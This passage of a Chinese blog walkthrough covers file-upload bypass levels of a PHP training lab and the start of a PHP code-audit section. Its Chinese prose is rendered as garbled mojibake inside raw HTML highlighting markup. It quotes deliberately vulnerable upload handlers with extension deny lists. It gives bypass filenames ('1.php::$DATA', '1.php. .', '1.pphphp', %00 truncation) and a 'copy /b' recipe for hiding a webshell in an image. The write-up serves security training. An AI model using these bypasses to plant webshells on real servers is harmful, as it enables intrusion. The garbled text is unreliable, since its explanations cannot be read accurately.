class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>è¿™æ®µä»£ç å°‘äº†è¿™å¥è¯ï¼Œå¯ä»¥ä¸ç¬¬å…­å…³ç›¸åŒçš„åšæ³•</p><p><code>$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</code></p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" style="zoom:67%;"><h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>ä»”ç»†è§‚å¯Ÿå‘ç°å°‘äº†è¿™æ®µä»£ç </p><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></code></pre><p> é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ </p><p>å°†æ–‡ä»¶åæ”¹ä¸º <code>1.php::$DATA</code>,ä½†æ˜¯å®è´¨ä¸Šä¿å­˜çš„æ–‡ä»¶è¿˜æ˜¯1.php</p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" style="zoom:50%;"><h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p> è¿™ä¸€å¥ä»£ç æ˜¯ç”¨æ¥æ£€æµ‹æœ«å°¾æ˜¯å¦æ˜¯<code>.</code>ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚<br>æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º<code>1.php. .</code> ï¼ˆæ³¨æ„ä¸¤ç‚¹ä¹‹é—´æœ‰ç©ºæ ¼ï¼‰ å‰é¢å»æ‰.ç„¶åæ£€éªŒ.ä¸å­˜åœ¨ï¼Œå†å»ç©ºæ ¼ï¼Œç•™ä¸‹php.ï¼Œç„¶åphp.ä¸å±äº$deny_extæ•°ç»„ä¸­å­˜åœ¨çš„ï¼Œå½“ç„¶å°±ç›´æ¥æäº¤äº†ã€‚å› ä¸ºwindowsè‡ªåŠ¨å»ç‚¹ï¼Œäºæ˜¯phpåç¼€å°±å‡ºæ¥äº† </p><img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;"><h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;                <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>è¿™æ®µä»£ç æ˜¯å°†æ–‡ä»¶åä¸­å‡ºç°  <code>deny_ext</code>çš„åç¼€åæ›¿æ¢ä¸ºç©º</p><p>å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå³<code>1.pphphp</code></p><h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;    &#125;&#125;</code></pre><p>æœ¬é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é¢˜çš„æ–‡ä»¶çš„ä¿å­˜è·¯å¾„æ˜¯å¯ä»¥æ§åˆ¶çš„</p><p>è¿™é‡Œç”¨çš„<code>%00æˆªæ–­</code>ï¼ŒåŸç†å¦‚ä¸‹</p><p><code>www.xxx.com/qq.jpg</code></p><p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>å…¶åç¼€åä¸º.jpgå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½†æ˜¯windowsç³»ç»Ÿå¤„ç†æ—¶ä¸ä¼šå¤„ç†%00ä¹‹åçš„å†…å®¹æ•…ä¿å­˜çš„æ–‡ä»¶å°±æ˜¯qq.php</p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" style="zoom:50%;"><h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>è¿™é¢˜ä¸ä¸Šé¢˜åˆ©ç”¨çš„åŸç†ç›¸åŒ</p><p>ä½†æ˜¯è¿™é‡Œè¦ä½¿ç”¨ 00çš„äºŒè¿›åˆ¶å½¢å¼</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13.png" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13-1.png" style="zoom:50%;"><h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>æ˜ç¡®è¯´äº†ä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//åªè¯»2å­—èŠ‚</span>    fclose(<span class="hljs-variable">$file</span>);    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);        <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;              <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;            <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;        &#125;            <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;&#125;</code></pre><p><strong>GIF89a</strong> æ˜¯GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´ ï¼Œæ˜¯ä¸ºäº†ç»•è¿‡gifæ–‡ä»¶çš„æ£€æŸ¥</p><p><strong>å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ</strong></p><p>æ¡Œé¢å»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°†å…¶æ”¹ä¸º2.jpgï¼Œå†å»ºç«‹ä¸€ä¸ªæ”¹ä¸º1.php,å…¶å†…å®¹ä¸ºä½ æƒ³æ·»åŠ çš„ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p><p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" style="zoom:50%;"><h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h2 id="1-in-array"><a href="#1-in-array" class="headerlink" title="1.in_array"></a>1.in_array</h2><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span>);&#125;<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();    <span class="hljs-variable">$whitelist</span> = range(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);&#125;<span class="hljs-variable">$id</span> = stop_hack(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;<span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);&#125;<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><strong>æ¼æ´è§£æ</strong> ï¼š</p><p>è¿™ä¸€å…³å¡è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œè€Œå¯¼è‡´è¿™ä¸€æ¼æ´çš„å‘ç”Ÿåˆ™æ˜¯ä¸å®‰å…¨çš„ä½¿ç”¨ <strong>in_array()</strong> å‡½æ•°æ¥æ£€æµ‹ä¸Šä¼ çš„æ–‡ä»¶åï¼Œå³ä¸Šå›¾ä¸­çš„ç¬¬12è¡Œéƒ¨åˆ†ã€‚ç”±äºè¯¥å‡½æ•°å¹¶æœªå°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º <strong>true</strong> ï¼Œè¿™å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ çš„æ–‡ä»¶åæ¥ç»•è¿‡æœåŠ¡ç«¯çš„æ£€æµ‹ï¼Œä¾‹å¦‚æ–‡ä»¶åä¸º <strong>7shell.php</strong> ã€‚å› ä¸ºPHPåœ¨ä½¿ç”¨ <strong>in_array()</strong> å‡½æ•°åˆ¤æ–­æ—¶ï¼Œä¼šå°† <strong>7shell.php</strong> å¼ºåˆ¶è½¬æ¢æˆæ•°å­—7ï¼Œè€Œæ•°å­—7åœ¨ <strong>range(1,24)</strong> æ•°ç»„ä¸­ï¼Œæœ€ç»ˆç»•è¿‡ <strong>in_array()</strong> å‡½æ•°åˆ¤æ–­ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ 